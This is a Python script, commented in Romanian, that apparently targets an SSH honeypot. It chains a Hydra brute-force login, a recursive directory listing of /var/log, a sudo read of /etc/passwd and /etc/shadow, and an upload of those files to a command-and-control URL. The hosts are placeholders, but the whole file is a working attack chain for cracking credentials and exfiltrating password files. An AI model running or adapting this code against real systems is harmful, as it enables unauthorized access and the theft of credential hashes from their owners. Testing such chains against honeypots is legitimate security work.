import subprocess
import re
import paramiko
import requests
import os

HONEYPOT_HOST = "0.0.0.0"
HONEYPOT_USER = "name"
REMOTE_FILES = ["/etc/passwd", "/etc/shadow"]
C2_URL = "https://0.0.0.0:5000/upload"

def run_hydra():
    """Rulează Hydra cu un fișier de parole și returnează parola găsită"""
    cmd = [
        "hydra",
        "-l", HONEYPOT_USER,
        "-P", "/path/to/passwords.txt",
        "-t", "4",
        "-f",
        HONEYPOT_HOST,
        "ssh"
    ]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = proc.stdout + proc.stderr
        match = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", output)
        if match:
            print(f"[+] Parola găsită de Hydra: {match.group(2)}")
            return match.group(2)
        else:
            print("[-] Nu s-a găsit parola în output-ul Hydra.")
            return None
    except subprocess.CalledProcessError as e:
        print(f"[-] Eroare la rularea Hydra: {e}")
        return None

def explore(ssh, path="/", depth=0, max_depth=2, file=None):
    if depth > max_depth:
        return
    try:
        stdin, stdout, stderr = ssh.exec_command(f"ls -1 {path}")
        items = stdout.read().decode().splitlines()
    except Exception as e:
        if file:
            file.write("  " * depth + f"[!] Eroare la listarea {path}: {e}\n")
        else:
            print("  " * depth + f"[!] Eroare la listarea {path}: {e}")
        return

    for item in items:
        full_path = path.rstrip("/") + "/" + item
        line = "  " * depth + "|-- " + item + "\n"
        if file:
            file.write(line)
        else:
            print(line, end="")
        stdin, stdout, stderr = ssh.exec_command(f'test -d "{full_path}" && echo DIR || echo FILE')
        typ = stdout.read().decode().strip()
        if typ == "DIR":
            explore(ssh, full_path, depth + 1, max_depth, file=file)

def get_files_from_honeypot(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HONEYPOT_HOST, username=HONEYPOT_USER, password=password)
    
    # Explorare folder
    with open("filesystem_map.txt", "w") as f:
        f.write(f"Explorare zone selectate din sistemul de fișiere pentru {HONEYPOT_HOST}:\n")
        for folder in ["/var/log"]:
            f.write(f"\nFolder: {folder}\n")
            explore(ssh, folder, 0, 1, file=f)
    print(f"[+] Structura sistemului de fișiere a fost salvată în filesystem_map.txt")
    
    # Descărcare fișiere
    for remote_file in REMOTE_FILES:
        local_file = os.path.basename(remote_file)
        try:
            # Rulează comanda cu sudo și trimite parola
            stdin, stdout, stderr = ssh.exec_command(f"sudo -S cat {remote_file}")
            stdin.write(f"{password}\n")
            stdin.flush()

            content = stdout.read().decode()
            with open(local_file, "w") as f:
                f.write(content)

            print(f"[+] Fișierul a fost descărcat local: {local_file}")
        except Exception as e:
            print(f"[-] Eroare la descărcarea {remote_file}: {e}")
            
    ssh.close()

def upload_to_c2():
    for remote_file in REMOTE_FILES:
        local_file = os.path.basename(remote_file)
        if not os.path.exists(local_file):
            print(f"[-] Fișierul {local_file} nu exista, nu poate fi uploadat.")
            continue

        with open(local_file, "rb") as f:
            files = {"file": (local_file, f)}
            try:
                response = requests.post(C2_URL, files=files, verify=False)
                if response.status_code == 200:
                    print(f"[+] Fișierul {local_file} trimis cu succes la C2")
                else:
                    print(f"[-] Eroare la upload {local_file}: {response.status_code} {response.text}")
            except Exception as e:
                print(f"[-] Eroare la conectarea la C2 pentru {local_file}: {e}")

if __name__ == "__main__":
    passwd = run_hydra()
    if passwd:
        get_files_from_honeypot(passwd)
        upload_to_c2()
    else:
        print("[-] Nu am parola, nu pot continua.")